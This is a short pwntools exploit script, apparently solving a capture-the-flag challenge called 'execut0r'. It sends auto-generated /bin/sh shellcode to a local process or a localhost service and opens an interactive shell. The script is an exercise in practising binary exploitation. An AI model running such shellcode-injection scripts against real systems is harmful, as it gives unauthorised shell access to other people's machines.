from pwn import *

exe = ELF('./execut0r')
context.binary = exe
context.log_level = 'debug'


if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process(exe.path)


shellcode = asm(shellcraft.sh()) #me genere un shellcode automatiquement hehe

io.sendline(shellcode)

io.interactive()